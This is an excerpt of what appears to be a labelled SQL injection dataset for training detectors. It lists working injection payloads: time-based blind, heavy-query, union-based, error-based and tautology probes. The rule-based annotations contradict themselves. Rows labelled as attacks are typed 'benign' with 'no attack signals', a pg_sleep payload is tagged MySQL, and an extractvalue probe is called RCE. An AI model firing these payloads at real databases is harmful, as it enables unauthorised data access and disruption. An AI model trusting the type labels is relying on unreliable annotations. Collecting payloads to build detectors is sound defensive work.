row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
3840,"1"" ) where 8196 = 8196",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3841,1 ) where 2010 = 2010,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3842,"1%"" ) ) ) and sleep ( 5 ) #",1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
3843,"1%"" and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""%"" = """,1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
3844,1%' ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
3845,1' ) where 6045 = 6045,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3846,select ( case when ( 9393 = 5530 ) then 9393 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3847,"1"" ) where 2702 = 2702 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1,,boolean_blind,generic,0.95,2702 = 2702 and detected — boolean_blind injection (priority 8) on generic,rule-based
3848,"1"" ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""ctrr"" = ""ctrr",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
3849,-8187' ) ) ) or 1698 = 2823#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3850,"-3347%"" or 9323 = 9323#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3851,"1%"" and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3852,"1' ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'skdm' = 'skdm",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
3853,1' ) ) as qaki where 5272 = 5272,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3854,1'|| ( select 'bqhi' from dual where 7409 = 7409,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3855,"-2325 ) union all select 4692,4692,4692,4692#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3856,"-1418"" ) where 7528 = 7528 order by 1#",1,,boolean_blind,generic,0.95,7528 = 7528 or detected — boolean_blind injection (priority 8) on generic,rule-based
3857,"1%' ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( '%' = '",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
3858,1' ) ) as tley where 3539 = 3539,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3859,( select ( case when ( 6461 = 1802 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual ),1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3860,"1"" ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( ""ilge"" like ""ilge",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3861,-6518' ) ) as vocx where 2539 = 2539 or ( 8652 = 2025 ) *2025--,1,,boolean_blind,generic,0.95,2539 = 2539 or detected — boolean_blind injection (priority 8) on generic,rule-based
